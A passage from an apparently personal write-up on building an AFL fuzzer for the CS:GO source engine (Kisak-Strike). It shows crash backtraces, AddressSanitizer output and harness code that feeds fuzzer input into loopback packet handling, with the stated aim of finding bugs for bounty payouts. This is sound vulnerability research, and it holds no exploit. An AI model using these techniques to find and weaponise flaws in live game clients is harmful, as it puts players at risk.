#7  0x00007fffc2dd4bb3 in CEconItemSystem::Init (this=0x61d0003e9e80) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/econ/econ_item_system.cpp:98
#8  0x00007fffc41fa2b6 in CCSInventoryManager::PostInit (this=0x7fffcc32eee0 <g_CSInventoryManager>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/cstrike15/cstrike15_item_inventory.cpp:199
#9  0x00007fffc1b038df in InvokeMethod (f=<optimized out>, timed=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/shared/igamesystem.cpp:372
#10 0x00007fffc12cde95 in CHLClient::PostInit (this=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/game/client/cdll_client_int.cpp:1741
#11 0x00007fffe572d046 in Host_PostInit () at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/host.cpp:5035
#12 0x00007fffe5743976 in Host_Init (bDedicated=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/host.cpp:5838
#13 0x00007fffe5c3dffc in Sys_InitGame (appSystemFactory=<optimized out>, pBaseDir=pBaseDir@entry=0x7ffff41cae40 <g_szBasedir> "", pwnd=<optimized out>, bIsDedicated=bIsDedicated@entry=0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll.cpp:1150
#14 0x00007fffe5c6e3c7 in CEngine::Load (this=<optimized out>, dedicated=<optimized out>, rootdir=0x7ffff41cae40 <g_szBasedir> "") at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_engine.cpp:245
#15 0x00007fffe5c5104b in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll2.cpp:2411
#16 0x00007fffe7270c95 in CAppSystemGroup::Run (this=this@entry=0x7fffffffd530) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#17 0x00007fffe5c608fe in CEngineAPI::RunListenServer (this=0x7fffe8ca08e0 <s_EngineAPI>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll2.cpp:1437
#18 0x00007ffff3ff89c5 in CAppSystemGroup::Run (this=0x7fffffffd8b0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#19 0x00007ffff3ff89c5 in CAppSystemGroup::Run (this=0x7fffffffd7b0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#20 0x00007ffff3fc224b in LauncherMain (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/launcher/launcher.cpp:1897
#21 0x00007ffff6d76083 in __libc_start_main (main=0x555555557390 <main(int, char**)>, argc=3, argv=0x7fffffffdc08, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdbf8) at ../csu/libc-start.c:308
#22 0x000055555555766e in _start ()


```
{% endraw %}

I have absolutely no idea as to why this is happening. Maybe try compiling with the normal compiler and see what happens?

And then we get an error in GetCPUInformation! Wonderful! /s Just delete everything and try to recompile??

After recompiling with the normal compiler we get the FindKey crash again, so it isn't about the binaries, it has something to do with something else.

Copy everything over from the Codecoveragething folder and then recompile to replace the binaries and see what happens? 

And we get the same VertexShader crash. Looking through the github issues there is this: https://github.com/SwagSoftware/Kisak-Strike/issues/17  so it seems that I have copied something inappropriately and that is causing shit to go haywire.

I remember that I had this same problem when I tried to compile the thing the first time, but I do not remember how I solved it, which is a bummer.

Lets just copy all of the shit from the Codecoveragething directory and see if it is a directory thing. Nope. It works fine after copying everything.

Now, of course, we can check to see if it is actually a binary issue, because now if we recompile and replace the bins and it crashes we know that it has something to do with the compilation process.

Aaaand it actually works? That is quite strange. I have absolutely no idea what it was, but copying all the shit worked.

Now that we have actually a working thing, lets try to compile with the asan sanitizer and afl-gcc-fast .

I am actually using the 3881ccd0b7520f67fd0b34f010443dc249cbc8f1 commit of afl which is quite a lot newer than the one which I used to build the BSP map file fuzzer, but lets hope that that doesn't break anything. If it does we can just use the older version so no biggie.

Uh oh:

{% raw %}
```
g++: fatal error: cannot specify ‘-o’ with ‘-c’, ‘-S’ or ‘-E’ with multiple files
```
{% endraw %}

Welp, there goes that. Lets try to use the older version.

And it actually worked!

Now trying to run: and it runs fine!

## Making the fuzzer itself


Soo now it is time to implement the actual fuzzer.

Here is the code for the scratch.GetBuffer code:

{% raw %}
```

class net_scratchbuffer_t
{
public:
	net_scratchbuffer_t()
	{
		m_pBufferNetMaxMessage = sm_NetScratchBuffers.Get();
		if ( !m_pBufferNetMaxMessage )
			m_pBufferNetMaxMessage = new buffer_t;
	}
	~net_scratchbuffer_t()
	{
		sm_NetScratchBuffers.PutObject( m_pBufferNetMaxMessage );
	}
	byte * GetBuffer() const
	{
		return m_pBufferNetMaxMessage->buf;
	}
	int Size() const
	{
		return NET_MAX_MESSAGE;
	}

private:
	struct buffer_t { byte buf[ NET_MAX_MESSAGE ]; };
	buffer_t *m_pBufferNetMaxMessage;	// buffer that is allocated and returned to shared pool

private:
	net_scratchbuffer_t( const net_scratchbuffer_t& );				// FORBID
	net_scratchbuffer_t& operator=( const net_scratchbuffer_t& );	// FORBID
	static CTSPool< buffer_t > sm_NetScratchBuffers;
};


```
{% endraw %}




So to get the size of the buffer just call scratch.Size() . We need this because we then take input from stdin in and then put it into the buffer.

First try is this:

{% raw %}
```

__AFL_FUZZ_INIT();
bool NET_GetLoopPacketmodded ( netpacket_t * packet )
{
	Assert ( packet );
	unsigned int data_length = 0;
	unsigned char *buf;
	//loopback_t	*loop = NULL;
	// skip these checks in the modded version because otherwise we may return null
	/*
	if ( packet->source > NS_SERVER )
		return false;
		
	if ( !s_LoopBacks[packet->source].PopItem( &loop ) )
	{
		return false;
	}

	if (loop->datalen == 0)
	{
		// no packet in loopback buffer
		delete loop;
		return ( NET_LagPacket( false, packet ) );
	}
	*/
	data_length = __AFL_FUZZ_TESTCASE_LEN;
	buf = __AFL_FUZZ_TESTCASE_BUF;

	// copy data from loopback buffer to packet 
	packet->from.SetAddrType( NSAT_NETADR );
	packet->from.m_adr.SetType( NA_LOOPBACK );


	// we do not have the loop packet right now:


	/*

	packet->size = loop->datalen;
	packet->wiresize = loop->datalen;
	Q_memcpy ( packet->data, loop->data, packet->size );
	
	loop->datalen = 0; // buffer is avalibale again

	if ( loop->data != loop->defbuffer )
	{
		delete loop->data;
		loop->data = loop->defbuffer;
	}

	delete loop;
	
	*/

	// copy the fuzzing buffer from afl to the thing:

	Q_memcpy(packet->data, buf, packet->size);
	//loop->datalen = 0;


	// allow lag system to modify packet
	return ( NET_LagPacket( true, packet ) );	
}

```
{% endraw %}

After fixing a couple typos lets see what happens when we call the program with afl-fuzz! (I am expecting a crash.)

Actually the thing does not work!

I only tested that it shows the console, but didn't test loading the map file.

Upon loading the map file we get an asan error:

{% raw %}
```
=================================================================
==16932==ERROR: AddressSanitizer: unknown-crash on address 0x7fffffff25e4 at pc 0x7fffe51e1570 bp 0x7fffffff24a0 sp 0x7fffffff2490
READ of size 16 at 0x7fffffff25e4 thread T0
    #0 0x7fffe51e156f  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1ec856f)
    #1 0x7fffe51e07d5  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1ec77d5)
    #2 0x7fffe51e1dc2  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1ec8dc2)
    #3 0x7fffe5204bec  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1eebbec)
    #4 0x7fffe50bf511  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1da6511)
    #5 0x7fffe50c5641  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1dac641)
    #6 0x7fffe5043aa1  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1d2aaa1)
    #7 0x7fffe4972b1e  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1659b1e)
    #8 0x7fffe497658c  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x165d58c)
    #9 0x7fffe4978e26  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x165fe26)
    #10 0x7fffe4971c29  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1658c29)
    #11 0x7fffe4d151d0  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x19fc1d0)
    #12 0x7fffe554eff5  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x2235ff5)
    #13 0x7fffe55acb69  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x2293b69)
    #14 0x7fffe55b1ce8  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x2298ce8)
    #15 0x7fffe5a49d89  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x2730d89)
    #16 0x7fffe5a267c0  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x270d7c0)
    #17 0x7fffe5a27356  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x270e356)
    #18 0x7fffe6fed2d3  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x3cd42d3)
    #19 0x7fffe5a36419  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x271d419)
    #20 0x7ffff3521c93  (bin/linux64/launcher_client.so+0x91c93)
    #21 0x7ffff3521c93  (bin/linux64/launcher_client.so+0x91c93)
    #22 0x7ffff34ec1f0  (bin/linux64/launcher_client.so+0x5c1f0)
    #23 0x7ffff6d76082  (/lib/x86_64-linux-gnu/libc.so.6+0x24082)
    #24 0x55555555766d  (/home/cyberhacker/Fuzzingpackets/game/csgo_linux64+0x366d)

Address 0x7fffffff25e4 is located in stack of thread T0 at offset 132 in frame
    #0 0x7fffe51e009f  (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1ec709f)

  This frame has 4 object(s):
    [32, 48) 'w'
    [64, 80) 'w'
    [96, 144) 'childMins' (line 474) <== Memory access at offset 132 partially overflows this variable
    [176, 224) 'childMaxs' (line 474)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: unknown-crash (/home/cyberhacker/Fuzzingpackets/game/bin/linux64/engine_client.so+0x1ec856f) 
Shadow bytes around the buggy address:
  0x10007fff6460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff6470: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff6480: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff6490: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff64a0: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
=>0x10007fff64b0: 00 00 f2 f2 00 00 f2 f2 00 00 00 00[00]00 f2 f2
  0x10007fff64c0: f2 f2 00 00 00 00 00 00 f3 f3 f3 f3 00 00 00 00
  0x10007fff64d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10007fff64e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
  0x10007fff64f0: f1 f1 00 00 f2 f2 00 00 f2 f2 00 00 00 00 00 00
  0x10007fff6500: f2 f2 f2 f2 00 00 00 00 00 00 f3 f3 f3 f3 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==16932==ABORTING

Thread 1 "csgo_linux64" received signal SIGABRT, Aborted.
__GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
50	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) where
#0  __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:50
#1  0x00007ffff6d74859 in __GI_abort () at abort.c:79
#2  0x00007ffff76902e2 in __sanitizer::Abort () at ../../../../src/libsanitizer/sanitizer_common/sanitizer_posix_libcdep.cc:155
#3  0x00007ffff769ae8c in __sanitizer::Die () at ../../../../src/libsanitizer/sanitizer_common/sanitizer_termination.cc:57
#4  0x00007ffff767c52c in __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffff1826, __in_chrg=<optimized out>) at ../../../../src/libsanitizer/asan/asan_report.cc:185
#5  0x00007ffff767bfa3 in __asan::ReportGenericError (pc=140737037342064, bp=bp@entry=140737488299168, sp=sp@entry=140737488299152, addr=140737488299492, is_write=is_write@entry=false, access_size=access_size@entry=16, exp=0, fatal=false) at ../../../../src/libsanitizer/asan/asan_report.cc:192
#6  0x00007ffff767d678 in __asan::__asan_report_load_n_noabort (addr=<optimized out>, size=size@entry=16) at ../../../../src/libsanitizer/asan/asan_rtl.cc:144
#7  0x00007fffe51e1570 in _mm_loadu_ps (__P=0x7fffffff25e4) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/mathlib/ssemath.h:4156
#8  LoadUnalignedSIMD (pSIMD=0x7fffffff25e4) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/mathlib/ssemath.h:3628
#9  FourVectors::LoadAndSwizzle (d=..., c=..., b=..., a=..., this=0x7fffabe07f20) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/mathlib/ssemath.h:4864
#10 CDispCollTree::AABBTree_GenerateBoxes_r (this=<optimized out>, nodeIndex=<optimized out>, pMins=<optimized out>, pMaxs=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/dispcoll_common.cpp:482
#11 0x00007fffe51e07d6 in CDispCollTree::AABBTree_GenerateBoxes_r (this=<optimized out>, nodeIndex=<optimized out>, pMins=0x7fffabdcb328, pMaxs=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/dispcoll_common.cpp:478
#12 0x00007fffe51e1dc3 in CDispCollTree::AABBTree_CalcBounds (this=this@entry=0x7fffabdcb320) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/dispcoll_common.cpp:497
#13 0x00007fffe5204bed in CDispCollTree::AABBTree_Create (this=0x7fffabdcb320, pDisp=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/public/dispcoll_common.cpp:309
#14 0x00007fffe50bf512 in CollisionBSPData_LoadDispInfo (pBSPData=<optimized out>, pTexinfo=<optimized out>, texinfoCount=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/cmodel_bsp.cpp:1222
#15 0x00007fffe50c5642 in CollisionBSPData_Load (pPathName=pPathName@entry=0x7fffe2063c3c "maps/de_dust2.bsp", pBSPData=pBSPData@entry=0x7fffe89d7d40 <g_BSPData>, pTexinfo=pTexinfo@entry=0x7fffa09b4800, texinfoCount=texinfoCount@entry=7553) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/cmodel_bsp.cpp:295
#16 0x00007fffe5043aa2 in CM_LoadMap (pPathName=pPathName@entry=0x7fffe2063c3c "maps/de_dust2.bsp", allowReusePrevious=allowReusePrevious@entry=false, pTexinfo=pTexinfo@entry=0x7fffa09b4800, texinfoCount=texinfoCount@entry=7553, checksum=checksum@entry=0x7fffffffbb90) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/cmodel.cpp:360
#17 0x00007fffe4972b1f in CModelLoader::Map_LoadModelGuts (this=<optimized out>, mod=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/modelloader.cpp:5119
#18 0x00007fffe497658d in CModelLoader::Map_LoadModel (this=this@entry=0x7fffe8948800 <g_ModelLoader>, mod=mod@entry=0x7fffe2063c34) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/modelloader.cpp:5075
#19 0x00007fffe4978e27 in CModelLoader::LoadModel (this=<optimized out>, mod=0x7fffe2063c34, pReferencetype=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/modelloader.cpp:4293
#20 0x00007fffe4971c2a in CModelLoader::GetModelForName (this=0x7fffe8948800 <g_ModelLoader>, name=<optimized out>, referencetype=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/modelloader.cpp:4067
#21 0x00007fffe4d151d1 in CGameServer::SpawnServer (this=this@entry=0x7fffe898a2c0 <sv>, mapname=mapname@entry=0x7fffe89f5c00 <g_HostState+32> "de_dust2", mapGroupName=mapGroupName@entry=0x7fffe89f5d00 <g_HostState+288> "", startspot=startspot@entry=0x0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sv_main.cpp:3121
#22 0x00007fffe554eff6 in Host_NewGame (mapName=mapName@entry=0x7fffe89f5c00 <g_HostState+32> "de_dust2", mapGroupName=mapGroupName@entry=0x7fffe89f5d00 <g_HostState+288> "", loadGame=loadGame@entry=false, bBackgroundLevel=<optimized out>, bSplitScreenConnect=<optimized out>, pszOldMap=pszOldMap@entry=0x0, pszLandmark=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/host.cpp:6266
#23 0x00007fffe55acb6a in CHostState::State_NewGame (this=this@entry=0x7fffe89f5be0 <g_HostState>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/host_state.cpp:436
#24 0x00007fffe55b1ce9 in CHostState::FrameUpdate (this=<optimized out>, time=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/host_state.cpp:788
#25 0x00007fffe5a49d8a in CEngine::Frame (this=0x7fffe8b08ee0 <g_Engine>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_engine.cpp:572
#26 0x00007fffe5a267c1 in CEngineAPI::MainLoop (this=0x7fffe8b08900 <s_EngineAPI>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll2.cpp:1161
#27 0x00007fffe5a27357 in CModAppSystemGroup::Main (this=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll2.cpp:2416
#28 0x00007fffe6fed2d4 in CAppSystemGroup::Run (this=this@entry=0x7fffffffd540) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#29 0x00007fffe5a3641a in CEngineAPI::RunListenServer (this=0x7fffe8b08900 <s_EngineAPI>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/engine/sys_dll2.cpp:1437
#30 0x00007ffff3521c94 in CAppSystemGroup::Run (this=0x7fffffffd8a0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#31 0x00007ffff3521c94 in CAppSystemGroup::Run (this=0x7fffffffd7a0) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/appframework/AppSystemGroup.cpp:775
#32 0x00007ffff34ec1f1 in LauncherMain (argc=<optimized out>, argv=<optimized out>) at /home/cyberhacker/Fuzzingpackets/Kisak-Strike/launcher/launcher.cpp:1897
#33 0x00007ffff6d76083 in __libc_start_main (main=0x555555557390 <main(int, char**)>, argc=6, argv=0x7fffffffdbf8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffdbe8) at ../csu/libc-start.c:308
#34 0x000055555555766e in _start ()


```
{% endraw %}

So the code crashes on the SIMD thing which I think is an intel processor thing.

There is even a comment on it by lwss :

{% raw %}
```

// lwss: This function is an ASAN exclusion.
// The reason is that a Vector address is always passed into this class ( 3 floats )
// However the simd reads 4 floats at a time because it is faster.
// This doesn't segfault because of the 16 byte memory alignments
#ifdef USE_ASAN
ATTRIBUTE_NO_SANITIZE_ADDRESS inline // can't combine these 2 attributes
#else
FORCEINLINE
#endif
fltx4 LoadUnalignedSIMD( const void *pSIMD )
{
	return _mm_loadu_ps( reinterpret_cast<const float *>( pSIMD ) );
}

```
{% endraw %}
but I have -DUSE_ASAN on the command line?

Lets manually remove the else:

{% raw %}
```

ATTRIBUTE_NO_SANITIZE_ADDRESS inline // can't combine these 2 attributes
fltx4 LoadUnalignedSIMD( const void *pSIMD )
{
	return _mm_loadu_ps( reinterpret_cast<const float *>( pSIMD ) );
}


```
{% endraw %}

because those files are inlined, it will take forever to recompile. :(

While that is compiling I am going to tell you about my motivation for this. The reason why I chose counter strike global offensive for fuzzing is that it is one of the most widely played video games in the world. Another reason is that the payouts which other people have gotten for finding bugs in the game has been quite high. Thirdly, Valve is notorious for not really giving a shit about security. (see https://news.ycombinator.com/item?id=26762170 and https://www.reddit.com/r/GlobalOffensive/comments/mu3xqs/rces_and_you_the_ones_valve_still_havent_patched/). Another reason for this is that the CSGO uses a lot of outdated libraries (such as older and vulnerable versions of XZip and XUnzip (see this: https://secret.club/2021/04/20/source-engine-rce-invite.html )).

After compiling and trying to fuzz, the fuzzer just hangs.

Maybe there is a problem with the deferred forkserver?

Also, maybe we should pass the input through a file, because then we don't need to handle the stdin shit?

After doing some of that it still gets stuck for some reason. Maybe try AFL_DEBUG and see what happens?

This is the output:

{% raw %}
```

[+] Enabled environment variable AFL_DEBUG with value 1
[+] Enabled environment variable AFL_DEBUG with value 1
[!] WARNING: AFL environment variable AFL_DEFER_FORKSRV is deprecated!
[+] Enabled environment variable AFL_FORKSRV_INIT_TMOUT with value 1000000
afl-fuzz++4.06a based on afl by Michal Zalewski and a large online community
[+] afl++ is maintained by Marc "van Hauser" Heuse, Heiko "hexcoder" Eißfeldt, Andrea Fioraldi and Dominik Maier
[+] afl++ is open source, get it at https://github.com/AFLplusplus/AFLplusplus
[+] NOTE: This is v3.x which changes defaults and behaviours - see README.md
[+] Enabled environment variable ASAN_OPTIONS with value alloc_dealloc_mismatch=0:abort_on_error=1:symbolize=0
[+] No -M/-S set, autoconfiguring for "-S default"
[*] Getting to work...
[+] Using exponential power schedule (FAST)
[+] Enabled testcache with 50 MB
[+] Generating fuzz data with a length of min=1 max=1048576
[*] Checking core_pattern...
[*] Checking CPU scaling governor...
[+] You have 8 CPU cores and 1 runnable tasks (utilization: 12%).
[+] Try parallel jobs - see /usr/local/share/doc/afl/fuzzing_in_depth.md#c-using-multiple-cores
[*] Setting up output directories...
[+] Output directory exists but deemed OK to reuse.
[*] Deleting old session data...
[+] Output dir cleanup successful.
[*] Checking CPU core loadout...
[+] Found a free CPU core, try binding to #0.
[*] Scanning './corpus/'...
[+] Loaded a total of 4331 seeds.
[*] Creating hard links for all input files...
[*] Validating target binary...
[+] Deferred forkserver enforced.
[*] Spinning up the fork server...
DEBUG: debug enabled
DEBUG: (1) id_str 32772, __afl_area_ptr 0x55bf9145d170, __afl_area_initial 0x55bf9145d170, __afl_area_ptr_dummy 0x55bf9145d170, __afl_map_addr 0x0, MAP_SIZE 65536, __afl_final_loc 0, __afl_map_size 65536, max_size_forkserver 8388608/0x800000
DEBUG: (2) id_str 32772, __afl_area_ptr 0x7f6469000000, __afl_area_initial 0x55bf9145d170, __afl_area_ptr_dummy 0x55bf9145d170, __afl_map_addr 0x0, MAP_SIZE 65536, __afl_final_loc 0, __afl_map_size 65536, max_size_forkserver 8388608/0x800000
DEBUG: cmplog id_str <null>
SDL video target is 'x11'
SDL failed to create GL compatibility profile (whichProfile=0!
This system supports the OpenGL extension GL_EXT_framebuffer_object.
This system supports the OpenGL extension GL_EXT_framebuffer_blit.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample.
This system DOES NOT support the OpenGL extension GL_APPLE_fence.
This system DOES NOT support the OpenGL extension GL_NV_fence.
This system supports the OpenGL extension GL_ARB_sync.
This system supports the OpenGL extension GL_EXT_draw_buffers2.
This system DOES NOT support the OpenGL extension GL_EXT_bindable_uniform.
This system DOES NOT support the OpenGL extension GL_APPLE_flush_buffer_range.
This system supports the OpenGL extension GL_ARB_map_buffer_range.
This system supports the OpenGL extension GL_ARB_vertex_buffer_object.
This system supports the OpenGL extension GL_ARB_occlusion_query.
This system DOES NOT support the OpenGL extension GL_APPLE_texture_range.
This system DOES NOT support the OpenGL extension GL_APPLE_client_storage.
This system DOES NOT support the OpenGL extension GL_ARB_uniform_buffer.
This system supports the OpenGL extension GL_ARB_vertex_array_bgra.
This system supports the OpenGL extension GL_EXT_vertex_array_bgra.
This system supports the OpenGL extension GL_ARB_framebuffer_object.
This system DOES NOT support the OpenGL extension GL_GREMEDY_string_marker.
This system supports the OpenGL extension GL_ARB_debug_output.
This system supports the OpenGL extension GL_EXT_direct_state_access.
This system DOES NOT support the OpenGL extension GL_NV_bindless_texture.
This system DOES NOT support the OpenGL extension GL_AMD_pinned_memory.
This system supports the OpenGL extension GL_EXT_framebuffer_multisample_blit_scaled.
This system supports the OpenGL extension GL_EXT_texture_sRGB_decode.
This system DOES NOT support the OpenGL extension GL_NVX_gpu_memory_info.
This system DOES NOT support the OpenGL extension GL_ATI_meminfo.
This system supports the OpenGL extension GL_EXT_texture_compression_s3tc.
This system supports the OpenGL extension GL_EXT_texture_compression_dxt1.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt3.
This system supports the OpenGL extension GL_ANGLE_texture_compression_dxt5.
This system supports the OpenGL extension GL_ARB_buffer_storage.
This system supports the OpenGL extension GLX_EXT_swap_control_tear.
[S_API] SteamAPI_Init(): Loaded '/home/cyberhacker/.local/share/Steam/linux64/steamclient.so' OK.
Setting breakpad minidump AppID = 730
SteamInternal_SetMinidumpSteamID:  Caching Steam ID:  76561198999137044 [API loaded no]
USRLOCAL path using Steam profile data folder:
/home/cyberhacker/.local/share/Steam/userdata/1038871316/730/local
Did not detect any valid joysticks.
RESZ NOT SUPPORTED!
INTZ NOT SUPPORTED!
RESZ NOT SUPPORTED!
INTZ NOT SUPPORTED!
Module /home/cyberhacker/Fuzzingpackets/game/bin/linux64/stdshader_dbg failed to load! Error: ((null))
Module stdshader_dbg failed to load! Error: ((null))
[RocketUI]Font size (614544)
[RocketUI]Loaded font face Lato (from memory).

 ##### swap interval = 0     swap limit = 1 #####
Module /home/cyberhacker/Fuzzingpackets/game/csgo/bin/matchmaking_client.so failed to load! Error: ((null))
Module /home/cyberhacker/Fuzzingpackets/game/csgo/bin/client_client.so failed to load! Error: ((null))
CClientSteamContext logged on = 1
Module /home/cyberhacker/Fuzzingpackets/game/csgo/bin/server failed to load! Error: ((null))
Game.dll loaded for "Counter-Strike: Global Offensive"
CGameEventManager::AddListener: event 'server_pre_shutdown' unknown.
CGameEventManager::AddListener: event 'game_newmap' unknown.
CGameEventManager::AddListener: event 'finale_start' unknown.
CGameEventManager::AddListener: event 'round_start' unknown.
CGameEventManager::AddListener: event 'round_end' unknown.
CGameEventManager::AddListener: event 'difficulty_changed' unknown.
CGameEventManager::AddListener: event 'player_connect' unknown.
CGameEventManager::AddListener: event 'player_disconnect' unknown.
GameTypes: missing mapgroupsSP entry for game type/mode (custom/custom).
GameTypes: missing mapgroupsSP entry for game type/mode (cooperative/cooperative).
GameTypes: missing mapgroupsSP entry for game type/mode (cooperative/coopmission).


```
{% endraw %}

after that it seems to get stuck. Maybe add some debug printfs and see what happens?

Maybe try getting rid of the AFL_DEFER_FORKSRV ? Getting rid of AFL_DEFER_FORKSRV just causes it to assume that it already has control when the process starts.

Oh, wait oopps:

I had these lines commented out because I compiled without afl compiler before:

{% raw %}
```
	#ifdef __AFL_HAVE_MANUAL_CONTROL
  	__AFL_INIT();
	#endif

```
{% endraw %}

Now it should work???

It still seems to get stuck for some reason. Maybe get rid of the #ifdef clause thing and also maybe try printing the debug statements to stderr because they do not seem to show up on stdout?

Now, if this does not work, I am all out of ideas.

Fuck! Make extra sure that it runs fine when not fuzzing??

Yeah it seems to work fine when not fuzzing so the problem is most likely in the deferred forkserver shit.

There is this line in the documentation: `If you want to be able to compile the target without afl-clang-fast/lto, then add this just after the includes:` and then a piece of code:

{% raw %}
```

#ifndef __AFL_FUZZ_TESTCASE_LEN
  ssize_t fuzz_len;
  #define __AFL_FUZZ_TESTCASE_LEN fuzz_len
  unsigned char fuzz_buf[1024000];
  #define __AFL_FUZZ_TESTCASE_BUF fuzz_buf
  #define __AFL_FUZZ_INIT() void sync(void);
  #define __AFL_LOOP(x) ((fuzz_len = read(0, fuzz_buf, sizeof(fuzz_buf))) > 0 ? 1 : 0)
  #define __AFL_INIT() sync()
#endif

```
{% endraw %}

Sooo lets try that??

Didn't work.

Maybe try moving __AFL_FUZZ_INIT inside the function?

Didn't work. Maybe try export AFL_PERSISTENT=1 ? That I think has to be set if your binary has persistent mode.


Maybe instead of using a file as input lets use the __AFL_FUZZ_TESTCASE_BUF and __AFL_FUZZ_TESTCASE_LEN shit?

Aaannd holy shit. I forgot to uncomment the fuzz_main_loop call. 🤦 No wonder this thing won't work!


Lets see what happens!

Still the same thing.

Lets just use gdb and set a breakpoint on fuzz_main_loop?

Setting a breakpoint on fuzz_main_loop does not get triggered in gdb, but that may just be that that specific thread does not jump to that idk.

Or am I just being impatient? Lets just wait for like ten minutes to make sure that the thing is actually stuck on something before jumping to conclusions.

After waiting for a really long while I get this output:

{% raw %}
```

Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
Called NET_ProcessSocket!
